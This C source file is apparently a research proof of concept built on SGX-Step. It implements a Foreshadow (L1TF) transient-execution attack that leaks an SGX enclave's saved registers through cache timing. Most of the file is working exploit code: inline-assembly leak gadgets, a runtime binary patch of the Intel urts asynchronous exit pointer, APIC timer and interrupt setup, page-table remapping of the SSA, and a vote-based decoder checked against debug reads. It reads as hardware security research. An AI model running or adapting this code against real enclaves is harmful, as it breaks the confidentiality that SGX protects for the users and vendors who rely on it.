/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  B.1: Foreshadow SSA/GPRSGX register leak with a WARM transient read, on the
 *  stock PSW 2.27 runtime (no TSX), via a binary-hooked AEP callback.
 *
 *  The transient SSA read only works if the SSA is in L1D. A #PF-triggered AEX
 *  routes through the kernel and evicts it (see app/foreshadow-ssa). Here the AEX
 *  is triggered by the APIC timer, handled by SGX-Step's minimal user-space ISR,
 *  and then our AEP callback runs in normal CPL3 context with the SSA still warm.
 *  The AEP callback is enabled on the stock runtime by binary-hooking the urts'
 *  default async-exit-pointer (.Lasync_exit_pointer, ENCLU;ud2) to jump to
 *  sgx_step_aep_trampoline (see app/aep-hook-test).
 *
 *  Victim: enclave_spin() loads known register values (rax=0xdeadbeefcafebabe,
 *  ..., r8..r15=0x88..0x15) then spins, so any AEX in the loop captures them.
 *  Each timer AEX -> aep_cb reads ONE trace (lo or hi) of ONE SSA byte warm (the
 *  transient's own #PF then evicts the SSA, so one warm read per AEX), votes, and
 *  re-arms the timer. Split lo/hi oracle in reload-all mode (distinct L1D sets).
 *  EDBGRD (debug read) gives ground truth for comparison.
 *
 *  Env: WARM_VOTES (votes per trace, default 12); VOTE_DUMP (file path: after
 *  the run, dump the raw per-byte vote vectors for offline cross-run statistics
 *  -- aggregate with harness/warm_vote_stats.py). RAW_LAT_DUMP (file path) +
 *  RAW_LAT_OFF (comma offsets, default "120,80"): also record the full per-vote
 *  lo-trace latency vector for those offsets, to tell signal loss (no hot slot)
 *  from mis-decode (a wrong hot slot). Recording perturbs the timing slightly, so
 *  record a weak target and a robust control together and compare (the
 *  perturbation is common to both). Off unless RAW_LAT_DUMP is set.
 *  ORACLE_LO_OFF (byte offset, base 0 so 0x400 works): shift the lo-oracle base
 *  within the allocation. Page-aligned (default 0) maps class c -> L1D set c;
 *  0x400 maps class c -> set (c+16) mod 64, so class 21 (0x15) lands in set 37
 *  instead of set 21. Measured 2026-09-20: r15/0x15 was 15/15 on both arms, so
 *  this shift is not a single-run 12/12 fix. Line-aligned values only; ignored
 *  if it would run past the buffer.
 *  DUAL_BASE=1: one warm lo-trace touches BOTH bases in a single gadget.
 *  Measured dead on this CPU (2026-09-21: conflict=4412/4416, lo locked to
 *  class 0x27). Kept so the negative result stays reproducible.
 *  DUAL_BASE=2: lo_A and lo_B are separate AEXes, each the historical
 *  64-slot argmin decoder. A vote is counted only when the two argmins
 *  agree. Hi stays one AEX on oracle_hi. The AEX budget is unchanged
 *  (SSA_BYTES*2*WARM_VOTES) so the enclave spin still covers it; with
 *  WARM_VOTES=24 that is 16 lo-pairs per byte. Measured 2026-09-21:
 *  2749/2944 agrees, but 11/12 against a 12/12 plain-oracle control on the
 *  same boot. ORACLE_LO_OFF is ignored for both dual modes. Off unless set.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <ucontext.h>
#include <sys/mman.h>

#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#include "libsgxstep/config.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/cache.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/idt.h"

#define ENCLAVE_SO      "Enclave/encl.so"
#define SLOT_SIZE       0x1040
#define LO_CLASSES      64
#define HI_CLASSES      4
#define SSA_BYTES       SGX_GPRSGX_SIZE      /* 184 */
#define HOT_CYCLES      150

extern void sgx_step_aep_trampoline(void);
extern aep_cb_t sgx_step_aep_cb;

/* oracle_lo is the historical page-aligned buffer (off=0). A second allocation
 * holds the shifted view so ORACLE_LO_OFF=0x400 does not change the off=0 BSS
 * size/placement -- a +0x400 pad on the single array coincided with a lo-oracle
 * SNR collapse (0/12 vs historical 11/12) while hi stayed ~100%. */
char __attribute__((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES];
char __attribute__((aligned(0x1000))) oracle_lo_shift[SLOT_SIZE * LO_CLASSES + 0x400];
char __attribute__((aligned(0x1000))) oracle_hi[SLOT_SIZE * HI_CLASSES];
static char *oracle_lo_base;
static char *oracle_lo_b;             /* shift view: oracle_lo_shift + 0x400 */
static unsigned oracle_lo_off = 0;
static int dual_base = 0;
static unsigned long dual_agree, dual_one, dual_conflict, dual_abstain;
/* DUAL_BASE=2: argmin from base A, waiting for the following AEX on base B. */
static int dual_pending_cls[SSA_BYTES];
static unsigned char dual_pending_arm[SSA_BYTES];
#define DUAL_SHIFT 0x400

sgx_enclave_id_t eid = 0;
void *ssa_ptr = NULL, *alias_ssa = NULL, *alias_ssa_page = NULL;
uint64_t *pte_ssa = NULL, pte_ssa_present = 0, pte_ssa_keep = 0;

static void *volatile skip_to = NULL;
static volatile unsigned long aex_count = 0, fault_skip = 0;
static int warm_votes = 12;
static long budget = 0;

static int votes_lo[SSA_BYTES][LO_CLASSES];
static int votes_hi[SSA_BYTES][HI_CLASSES];

/* raw per-vote lo-trace latency capture (diagnostic; enabled by RAW_LAT_DUMP) */
#define RAW_NOFF   4
#define RAW_MAXTR  64
static int raw_on = 0;
static const char *raw_dump_path = NULL;
static int raw_off[RAW_NOFF];
static int raw_noff = 0;
static int raw_ntr[RAW_NOFF] = {0};
static int raw_best[RAW_NOFF][RAW_MAXTR];
static uint32_t raw_lat[RAW_NOFF][RAW_MAXTR][LO_CLASSES];

static gprsgx_region_t shadow_edbgrd = {0};
static volatile int edbgrd_captured = 0;

/* ---- transient blocks (deposit warm, fault handled by the skip handler) ---- */
static inline void leak_lo(void *base, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t   movzbl %%al, %%eax\n\t   and $0x3f, %%eax\n\t"
        "   imul %3, %%rax\n\t   movq (%2, %%rax), %%rdi\n\t 2:\n\t"
        : "=m"(skip_to) : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}
/* One warm window, two dependent oracle fills. B (shifted, set+16) first:
 * the L1TF window on this part may only complete one fill. */
static inline void leak_lo_dual(void *base_a, void *base_b, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t   movzbl %%al, %%eax\n\t   and $0x3f, %%eax\n\t"
        "   imul %4, %%rax\n\t"
        "   movq (%3, %%rax), %%rsi\n\t"
        "   movq (%2, %%rax), %%rdi\n\t"
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base_a), "r"(base_b), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "rsi", "memory");
}
static inline void leak_hi(void *base, void *adrs)
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t   movzbl %%al, %%eax\n\t   shr $6, %%eax\n\t"
        "   imul %3, %%rax\n\t   movq (%2, %%rax), %%rdi\n\t 2:\n\t"
        : "=m"(skip_to) : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

static inline int set_of(void *p) { return (int)(((uint64_t) p >> 6) & 63); }

static inline int raw_idx(int byte)
{
    int i;
    for (i = 0; i < raw_noff; i++) if (raw_off[i] == byte) return i;
    return -1;
}

/* reload-all decode of one trace: one warm transient, then time every slot; the
 * split slots are in distinct L1D sets so the scan does not self-evict. Exclude
 * the slot sharing the SSA line's set (false-hot from the transient's SSA read). */
static int decode_trace_warm(void *base, int classes, int hi, void *adrs)
{
    int c, best = -1, excl = -1;
    uint64_t t, b = ~0UL, excl_t = ~0UL;
    int ssa_set = set_of(adrs);
    /* diagnostic: capture the full latency vector for target offsets only */
    int raw_k = (!hi && raw_on)
        ? raw_idx((int)((char *) adrs - (char *) alias_ssa)) : -1;
    uint32_t lat[LO_CLASSES];

    for (c = 0; c < classes; c++)
        flush((char *) base + (uint64_t) c * SLOT_SIZE);
    if (hi) leak_hi(base, adrs); else leak_lo(base, adrs);
    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (uint64_t) c * SLOT_SIZE;
        t = reload(slot);
        if (raw_k >= 0) lat[c] = (uint32_t) t;
        if (set_of(slot) == ssa_set) { excl = c; excl_t = t; continue; }
        if (t < b) { b = t; best = c; }
    }
    /*
     * The excluded slot shares the SSA line's L1 set and is warmed by the
     * transient's own SSA read, so it is a false hit whenever the true class is
     * some OTHER slot -- but it is the ONLY signal when the true class collides
     * with the SSA set. No single threshold decides this reliably on this host:
     * `+20` leaves r15 (whose class 0x15 collides at its offsets) systematically
     * wrong; a looser `+8` fixes r15 but picks the false hit over a real one and
     * corrupts r8/r9; a last-resort `b >= HOT_CYCLES` scatters the errors (even
     * the canaries flake). Measured over 5 runs each -- it is whack-a-mole. Kept
     * at the conservative `+20`: best register count (11/12) and stable canaries;
     * r15 is one cleanly-explained artifact. A guaranteed 12/12 needs the oracle
     * geometry de-confounded (two bases with different excluded classes), not a
     * threshold tweak -- see STATUS.md.
     */
    if (excl >= 0 && excl_t + 20 < b)
        best = excl;
    if (raw_k >= 0 && raw_ntr[raw_k] < RAW_MAXTR)
    {
        int tr = raw_ntr[raw_k]++;
        raw_best[raw_k][tr] = best;
        memcpy(raw_lat[raw_k][tr], lat, sizeof(uint32_t) * LO_CLASSES);
    }
    return best;
}

/* Dual-base lo decode. Flush both, one leak_lo_dual, interleaved reload
 * (A[c] and B[c] are different sets; walking all of A first would touch
 * B[c]'s set via A[c+16]). Hot-gate, not argmin: a cold trace's fastest
 * slot is noise. SSA-set exclusion is per base; the two bases cannot
 * exclude the same class, so a collision on A is covered by B. */
static int decode_lo_dual(void *adrs)
{
    int c, hot_a = -1, hot_b = -1;
    uint64_t best_a = ~0UL, best_b = ~0UL, t_a, t_b;
    int ssa_set = set_of(adrs);

    for (c = 0; c < LO_CLASSES; c++)
    {
        flush(oracle_lo + (uint64_t) c * SLOT_SIZE);
        flush(oracle_lo_b + (uint64_t) c * SLOT_SIZE);
    }
    leak_lo_dual(oracle_lo, oracle_lo_b, adrs);
    for (c = 0; c < LO_CLASSES; c++)
    {
        char *sa = oracle_lo + (uint64_t) c * SLOT_SIZE;
        char *sb = oracle_lo_b + (uint64_t) c * SLOT_SIZE;
        t_a = reload(sa);
        t_b = reload(sb);
        if (set_of(sa) != ssa_set && t_a < HOT_CYCLES && t_a < best_a)
        {
            best_a = t_a;
            hot_a = c;
        }
        if (set_of(sb) != ssa_set && t_b < HOT_CYCLES && t_b < best_b)
        {
            best_b = t_b;
            hot_b = c;
        }
    }
    if (hot_a >= 0 && hot_b >= 0)
    {
        if (hot_a == hot_b)
        {
            dual_agree++;
            return hot_a;
        }
        dual_conflict++;
        return (best_a <= best_b) ? hot_a : hot_b;
    }
    if (hot_a >= 0 || hot_b >= 0)
    {
        dual_one++;
        return (hot_a >= 0) ? hot_a : hot_b;
    }
    dual_abstain++;
    return -1;
}

/* ---- AEP callback: runs warm in CPL3 after each timer AEX ---- */
void aep_cb(void)
{
    long idx = (long) aex_count;
    aex_count++;

    /* NO edbgrd here: reading /proc/self/mem would pull the SSA into L1D and
     * confound "warm from the AEX" with "warm because I just read it". Ground
     * truth is taken ONCE after the run. The transient leak below therefore sees
     * the SSA only as the AEX left it. */

    /* one warm trace read per AEX (the transient's #PF evicts the SSA after) */
    if (idx < budget)
    {
        /* NO page-table write in the hot path: the alias stays present-cleared
         * from setup (the skip handler never re-presents it). Writing the PTE +
         * TLB traffic here would evict the warm GPRSGX before we read it. */
        if (dual_base == 2)
        {
            /* 0 = lo on A, 1 = lo on B, 2 = hi. A and B are back-to-back
             * for the same byte. Count a lo vote only if argmins match. */
            int phase = (int)(idx % 3);
            int byte = (int)((idx / 3) % SSA_BYTES);
            void *adrs = (char *) alias_ssa + byte;
            if (phase == 0)
            {
                dual_pending_cls[byte] = decode_trace_warm(oracle_lo, LO_CLASSES, 0, adrs);
                dual_pending_arm[byte] = 1;
            }
            else if (phase == 1)
            {
                int bcls = decode_trace_warm(oracle_lo_b, LO_CLASSES, 0, adrs);
                if (dual_pending_arm[byte])
                {
                    int acls = dual_pending_cls[byte];
                    dual_pending_arm[byte] = 0;
                    if (acls >= 0 && bcls >= 0 && acls == bcls)
                    {
                        votes_lo[byte][acls & 0x3f]++;
                        dual_agree++;
                    }
                    else if (acls < 0 || bcls < 0)
                        dual_abstain++;
                    else
                        dual_conflict++;
                }
            }
            else
            {
                int cls = decode_trace_warm(oracle_hi, HI_CLASSES, 1, adrs);
                if (cls >= 0) votes_hi[byte][cls & 3]++;
            }
        }
        else
        {
            int byte = (int)((idx / 2) % SSA_BYTES);
            int hi = (int)(idx & 1);
            int cls;
            if (!hi && dual_base == 1)
                cls = decode_lo_dual((char *) alias_ssa + byte);
            else
                cls = decode_trace_warm(hi ? (void*)oracle_hi : (void*)oracle_lo_base,
                                        hi ? HI_CLASSES : LO_CLASSES, hi,
                                        (char *) alias_ssa + byte);
            if (cls >= 0)
            {
                if (hi) votes_hi[byte][cls & 3]++;
                else    votes_lo[byte][cls & 0x3f]++;
            }
        }
    }
    else
    {
        /* budget spent: mask the periodic APIC timer so the enclave finishes.
         * (apic_write reaches the x2APIC MSR from CPL3 via the driver's gate) */
        apic_write(APIC_LVTT, apic_read(APIC_LVTT) | (1 << 16));
    }
}

/* ---- skip handler for the transient read faults ---- */
static void fault_handler(int sig, siginfo_t *si, void *ctx)
{
    (void) sig; (void) si;
    fault_skip++;
    ((ucontext_t *) ctx)->uc_mcontext.gregs[REG_RIP] = (greg_t) skip_to;
}

/* ---- binary hook of the stock urts AEP ---- */
static int hook_urts_aep(void)
{
    const unsigned char pat[5] = { 0x0f, 0x01, 0xd7, 0x0f, 0x0b };
    FILE *f = fopen("/proc/self/maps", "r");
    char line[512], perm[8], path[256];
    uint64_t start, end;
    unsigned char *hit = NULL;

    ASSERT(f);
    while (fgets(line, sizeof(line), f))
    {
        path[0] = 0;
        if (sscanf(line, "%lx-%lx %7s %*x %*x:%*x %*d %255[^\n]", &start, &end, perm, path) < 3)
            continue;
        if (perm[2] != 'x' || !strstr(path, "libsgx_urts.so")) continue;
        for (unsigned char *p = (unsigned char *) start; p + 5 <= (unsigned char *) end; p++)
            if (memcmp(p, pat, 5) == 0) { hit = p; break; }
        if (hit) break;
    }
    fclose(f);
    if (!hit) { info("AEP pattern not found"); return -1; }

    info("stock AEP at %p -> trampoline %p", hit, (void *) sgx_step_aep_trampoline);
    void *page = (void *) ((uintptr_t) hit & ~0xfffUL);
    ASSERT( !mprotect(page, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC) );
    unsigned char patch[12] = { 0x48, 0xb8, 0,0,0,0,0,0,0,0, 0xff, 0xe0 };
    uint64_t tramp = (uint64_t) sgx_step_aep_trampoline;
    memcpy(patch + 2, &tramp, 8);
    memcpy(hit, patch, sizeof(patch));
    ASSERT( !mprotect(page, 0x2000, PROT_READ | PROT_EXEC) );
    __builtin___clear_cache((char *) hit, (char *) hit + 12);
    return 0;
}

/* ---- verification ---- */
static struct { const char *name; int off; uint64_t val; } known[] = {
    { "rax", 0, 0xdeadbeefcafebabeULL }, { "rcx", 8, 0xd0000dbaaaaaaaadULL },
    { "rdx", 16, 0xdeadc0debaadf00dULL }, { "rbx", 24, 0xdabbad00dabbad00ULL },
    { "r8", 64, 0x8888888888888888ULL }, { "r9", 72, 0x9999999999999999ULL },
    { "r10", 80, 0x1010101010101010ULL }, { "r11", 88, 0x1111111111111111ULL },
    { "r12", 96, 0x1212121212121212ULL }, { "r13", 104, 0x1313131313131313ULL },
    { "r14", 112, 0x1414141414141414ULL }, { "r15", 120, 0x1515151515151515ULL },
};

/* Offline cross-run statistics (env VOTE_DUMP): write the per-byte vote vectors
 * so that several runs can be aggregated per offset / register / physical GPRSGX
 * line and L1D set -- see harness/warm_vote_stats.py. ASCII, '#' = comment:
 *   E <off> <byte>     ground-truth byte (edbgrd; may vary between runs for RIP)
 *   D <off> <byte>     byte decoded from THIS run's votes
 *   L <off> <64 ints>  lo-trace (6-bit class) vote counts
 *   H <off> <4 ints>   hi-trace (2-bit class) vote counts
 */
static void dump_votes(const char *path, const gprsgx_region_t *gt,
                       const gprsgx_region_t *dec,
                       unsigned long aex, unsigned long faults)
{
    FILE *f = fopen(path, "w");
    int j, c;
    if (!f) { info("VOTE_DUMP: cannot open %s", path); return; }
    fprintf(f, "# ssawarm-votes v1\n");
    fprintf(f, "# votes_per_trace %d\n", warm_votes);
    fprintf(f, "# aex %lu\n", aex);
    fprintf(f, "# faults %lu\n", faults);
    fprintf(f, "# alias_ssa %p\n", alias_ssa);
    fprintf(f, "# oracle_lo_alloc %p\n", (void *) oracle_lo);
    fprintf(f, "# oracle_lo %p\n", (void *) oracle_lo_base);
    fprintf(f, "# oracle_lo_off 0x%x\n", oracle_lo_off);
    fprintf(f, "# oracle_lo_set %d\n", set_of(oracle_lo_base));
    fprintf(f, "# dual %d\n", dual_base);
    fprintf(f, "# oracle_lo_b %p\n", dual_base ? (void *) oracle_lo_b : NULL);
    fprintf(f, "# oracle_lo_b_set %d\n",
            dual_base ? set_of(oracle_lo_b) : -1);
    fprintf(f, "# oracle_hi %p\n", (void *) oracle_hi);
    for (j = 0; j < SSA_BYTES; j++)
    {
        if (gt) fprintf(f, "E %d %u\n", j, (unsigned) gt->bytes[j]);
        fprintf(f, "D %d %u\n", j, (unsigned) dec->bytes[j]);
        fprintf(f, "L %d", j);
        for (c = 0; c < LO_CLASSES; c++) fprintf(f, " %d", votes_lo[j][c]);
        fprintf(f, "\n");
        fprintf(f, "H %d", j);
        for (c = 0; c < HI_CLASSES; c++) fprintf(f, " %d", votes_hi[j][c]);
        fprintf(f, "\n");
    }
    fclose(f);
    info("VOTE_DUMP: wrote %s", path);
}

/* Raw per-vote lo-trace latency vectors for the RAW_LAT_OFF target offsets. Lets
 * an offline pass tell signal loss (the true class's slot is not hot -- all slots
 * slow) from mis-decode (a wrong slot is faster than the true one). Format:
 *   # off <o> truth <byte> lo_class <c> traces <n>
 *   R <off> <trace> best <cls> : <64 latencies>
 */
static void dump_rawlat(const char *path)
{
    FILE *f = fopen(path, "w");
    int i, tr, c;
    if (!f) { info("RAW_LAT: cannot open %s", path); return; }
    fprintf(f, "# ssawarm-rawlat v1\n");
    fprintf(f, "# oracle_lo_alloc %p\n", (void *) oracle_lo);
    fprintf(f, "# oracle_lo %p\n", (void *) oracle_lo_base);
    fprintf(f, "# oracle_lo_off 0x%x\n", oracle_lo_off);
    fprintf(f, "# oracle_lo_set %d\n", set_of(oracle_lo_base));
    fprintf(f, "# alias_ssa %p\n", alias_ssa);
    fprintf(f, "# slot_size %d\n# lo_classes %d\n", SLOT_SIZE, LO_CLASSES);
    for (i = 0; i < raw_noff; i++)
    {
        int off = raw_off[i];
        int truth = edbgrd_captured ? (int) shadow_edbgrd.bytes[off] : -1;
        fprintf(f, "# off %d truth %d lo_class %d traces %d\n",
                off, truth, truth & 0x3f, raw_ntr[i]);
        for (tr = 0; tr < raw_ntr[i]; tr++)
        {
            fprintf(f, "R %d %d best %d :", off, tr, raw_best[i][tr]);
            for (c = 0; c < LO_CLASSES; c++) fprintf(f, " %u", raw_lat[i][tr][c]);
            fprintf(f, "\n");
        }
    }
    fclose(f);
    info("RAW_LAT: wrote %s (%d offsets)", path, raw_noff);
}

int main(int argc, char **argv)
{
    sgx_launch_token_t token = {0};
    int updated = 0, i, j;
    struct sigaction sa;
    idt_t idt = {0};
    gprsgx_region_t shadow = {0};
    const char *dump_path = NULL;

    setvbuf(stdout, NULL, _IOLBF, 0);
    if (getenv("WARM_VOTES")) warm_votes = atoi(getenv("WARM_VOTES"));
    if (warm_votes < 1) warm_votes = 1;
    budget = (long) SSA_BYTES * 2 * warm_votes;
    dump_path = getenv("VOTE_DUMP");
    info("warm SSA leak: votes/trace=%d, AEX budget=%ld", warm_votes, budget);
    if (dump_path) info("VOTE_DUMP -> %s", dump_path);

    /* Phase 0: optional lo-oracle base shift (class c -> set (base_set+c) mod 64). */
    oracle_lo_base = oracle_lo;
    {
        const char *off_s = getenv("ORACLE_LO_OFF");
        if (off_s && *off_s)
        {
            oracle_lo_off = (unsigned) strtoul(off_s, NULL, 0);
            if (oracle_lo_off & 63U)
            {
                info("ORACLE_LO_OFF=0x%x not line-aligned; using 0", oracle_lo_off);
                oracle_lo_off = 0;
            }
            else if (oracle_lo_off != 0 &&
                     (unsigned long) oracle_lo_off + (unsigned long) SLOT_SIZE * LO_CLASSES
                     > sizeof(oracle_lo_shift))
            {
                info("ORACLE_LO_OFF=0x%x exceeds shift buffer; using 0", oracle_lo_off);
                oracle_lo_off = 0;
            }
            if (oracle_lo_off == 0)
                oracle_lo_base = oracle_lo;
            else
                oracle_lo_base = oracle_lo_shift + oracle_lo_off;
        }
        info("oracle_lo used=%p off=0x%x base_set=%d (class 21 -> set %d)",
             (void *) oracle_lo_base, oracle_lo_off, set_of(oracle_lo_base),
             (set_of(oracle_lo_base) + 21) & 63);
    }

    oracle_lo_b = oracle_lo_shift + DUAL_SHIFT;
    {
        const char *db = getenv("DUAL_BASE");
        int mode = (db && *db) ? atoi(db) : 0;
        if (mode == 1 || mode == 2)
        {
            dual_base = mode;
            /* Control array stays page-aligned. The shift view is only base B. */
            oracle_lo_base = oracle_lo;
            oracle_lo_off = 0;
            info("DUAL_BASE=%d: A=%p set=%d  B=%p set=%d (class 21 -> set %d / %d)",
                 mode, (void *) oracle_lo, set_of(oracle_lo),
                 (void *) oracle_lo_b, set_of(oracle_lo_b),
                 (set_of(oracle_lo) + 21) & 63,
                 (set_of(oracle_lo_b) + 21) & 63);
            if (mode == 2)
                info("DUAL_BASE=2: separate AEX, vote iff argmins agree; "
                     "lo-pairs/byte=%ld (AEX budget stays %ld)",
                     budget / (SSA_BYTES * 3), budget);
        }
        else if (mode != 0)
            info("DUAL_BASE=%d unknown; single base", mode);
    }

    raw_dump_path = getenv("RAW_LAT_DUMP");
    if (raw_dump_path)
    {
        const char *rl = getenv("RAW_LAT_OFF");
        char buf[64], *p;
        raw_on = 1;
        strncpy(buf, rl ? rl : "120,80", sizeof(buf) - 1);
        buf[sizeof(buf) - 1] = 0;
        for (p = strtok(buf, ","); p && raw_noff < RAW_NOFF; p = strtok(NULL, ","))
            raw_off[raw_noff++] = atoi(p);
        info("RAW_LAT: %d target offset(s) -> %s", raw_noff, raw_dump_path);
    }

    info("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave(ENCLAVE_SO, /*debug=*/1, &token, &updated, &eid, NULL) );

    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
    register_enclave_info();
    print_enclave_info();

    /* frame-0 GPRSGX address (CSSA-independent), + present-cleared alias */
    {
        extern void *sgx_get_tcs(void);
        uint64_t ossa = 0;
        edbgrd((char *) sgx_get_tcs() + SGX_TCS_OSSA_OFFSET, &ossa, sizeof(ossa));
        ssa_ptr = (char *) get_enclave_base() + ossa + SGX_SSAFRAMESIZE - SGX_GPRSGX_SIZE;
    }
    alias_ssa = remap_page_table_level(ssa_ptr, PAGE);
    alias_ssa_page = (void *) ((uint64_t) alias_ssa & ~UINT64_C(0xfff));
    ASSERT( pte_ssa = remap_page_table_level(alias_ssa, PTE) );
    pte_ssa_present = *pte_ssa;
    pte_ssa_keep = MARK_NOT_PRESENT(pte_ssa_present);
    info("SSA frame0 at %p; alias %p", ssa_ptr, alias_ssa);
    ASSERT( !mprotect(alias_ssa_page, 0x1000, PROT_NONE) );
    *pte_ssa = pte_ssa_keep;

    /* skip handler for the transient read faults */
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
    ASSERT( !sigaction(SIGSEGV, &sa, NULL) );

    /* install the AEP hook + the timer IRQ path */
    ASSERT( !hook_urts_aep() );
    sgx_step_aep_cb = aep_cb;
    map_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);

    /* PERIODIC APIC timer: fires continuously, so it reliably lands inside the
     * ~1s enclave_spin loop (a single one-shot armed before EENTER fires outside
     * the enclave and is never re-armed). aep_cb masks it once the budget is
     * spent. Interval tunable; too small -> zero-stepping, too large -> few AEX. */
    {
        int interval = getenv("TIMER_INTERVAL") ? atoi(getenv("TIMER_INTERVAL")) : 5000;
        apic_write(APIC_LVTT, IRQ_VECTOR | (1 << 17) /* periodic */);
        apic_write(APIC_TDCR, APIC_TDR_DIV_2);
        __ss_irq_fired = 0;
        apic_timer_irq(interval);
        while (!__ss_irq_fired);
        info("APIC periodic timer works (interval=%d); entering spinning enclave", interval);
    }

    SGX_ASSERT( enclave_spin(eid) );
    /* make sure the timer is masked after the run */
    apic_write(APIC_LVTT, apic_read(APIC_LVTT) | (1 << 16));

    /* ground truth AFTER the run (no L1D warming during the leak): the SSA frame
     * still holds the last AEX's register state until the next enclave entry. */
    edbgrd(ssa_ptr, shadow_edbgrd.bytes, SSA_BYTES);
    edbgrd_captured = 1;

    info("done: AEX=%lu, transient-read faults=%lu (1 per AEX = 1 leak/AEX)",
         aex_count, fault_skip);
    if (dual_base == 1)
        info("DUAL_BASE votes: agree=%lu one=%lu conflict=%lu abstain=%lu",
             dual_agree, dual_one, dual_conflict, dual_abstain);
    else if (dual_base == 2)
        info("DUAL_BASE=2 pairs: agree=%lu disagree=%lu miss=%lu",
             dual_agree, dual_conflict, dual_abstain);

    /* vote -> recovered frame (most-common class per trace) */
    for (j = 0; j < SSA_BYTES; j++)
    {
        int lo = 0, hi = 0, k;
        for (k = 1; k < LO_CLASSES; k++) if (votes_lo[j][k] > votes_lo[j][lo]) lo = k;
        for (k = 1; k < HI_CLASSES; k++) if (votes_hi[j][k] > votes_hi[j][hi]) hi = k;
        shadow.bytes[j] = (uint8_t)(((hi & 3) << 6) | (lo & 0x3f));
    }
    if (dual_base == 2)
    {
        int empty = 0, j2, k2;
        for (j2 = 0; j2 < SSA_BYTES; j2++)
        {
            int s = 0;
            for (k2 = 0; k2 < LO_CLASSES; k2++) s += votes_lo[j2][k2];
            if (s == 0) empty++;
        }
        info("DUAL_BASE=2 bytes with no agreed lo vote: %d/%d", empty, SSA_BYTES);
    }

    int n = (int)(sizeof(known)/sizeof(known[0]));
    info_event("EDBGRD ground truth (debug read)");
    dump_gprsgx_region(&shadow_edbgrd);
    info_event("Foreshadow WARM transient result (the attack)");
    dump_gprsgx_region(&shadow);
    {
        int okg = 0, okt = 0, okb = 0;
        for (i = 0; i < n; i++)
        {
            uint64_t gt = 0, tr = 0;
            memcpy(&gt, &shadow_edbgrd.bytes[known[i].off], 8);
            memcpy(&tr, &shadow.bytes[known[i].off], 8);
            int rb = 0, k;
            for (k = 0; k < 8; k++)
                if (shadow.bytes[known[i].off + k] == ((uint8_t*)&known[i].val)[k]) rb++;
            okb += rb;
            if (gt == known[i].val) okg++;
            if (tr == known[i].val) okt++;
            info("  %-3s edbgrd=0x%016lx transient=0x%016lx  %d/8%s",
                 known[i].name, gt, tr, rb, tr == known[i].val ? "  [OK]" : "");
        }
        info("[EDBGRD]  %d/%d registers", okg, n);
        info("[TRANSIENT-WARM]  %d/%d registers ; %d/96 known bytes", okt, n, okb);

        /* AEX-written canaries I never planted in any register: RIP (an enclave
         * code address) and URSP (the untrusted RSP at ERESUME). Recovering these
         * transiently proves a LIVE AEX-window read, not a self-warmed constant. */
        {
            uint64_t rip_t = 0, rip_g = 0, ursp_t = 0, ursp_g = 0;
            uint64_t base = (uint64_t) get_enclave_base();
            memcpy(&rip_t,  &shadow.bytes[136], 8);  memcpy(&rip_g,  &shadow_edbgrd.bytes[136], 8);
            memcpy(&ursp_t, &shadow.bytes[144], 8);  memcpy(&ursp_g, &shadow_edbgrd.bytes[144], 8);
            info("  RIP  transient=0x%016lx edbgrd=0x%016lx  %s", rip_t, rip_g,
                 (rip_t == rip_g) ? "[MATCH]" :
                 (rip_t >= base && rip_t < base + 0x200000) ? "[in-enclave]" : "");
            info("  URSP transient=0x%016lx edbgrd=0x%016lx  %s", ursp_t, ursp_g,
                 (ursp_t == ursp_g) ? "[MATCH]" : "");
            info("[CANARY] RIP/URSP are written by the AEX and never planted -- a match "
                 "proves the transient reads live AEX state, not a self-warmed page");
        }
    }

    if (dump_path)
        dump_votes(dump_path, edbgrd_captured ? &shadow_edbgrd : NULL, &shadow,
                   (unsigned long) aex_count, (unsigned long) fault_skip);
    if (raw_dump_path)
        dump_rawlat(raw_dump_path);

    restore_system_state();
    return 0;
}
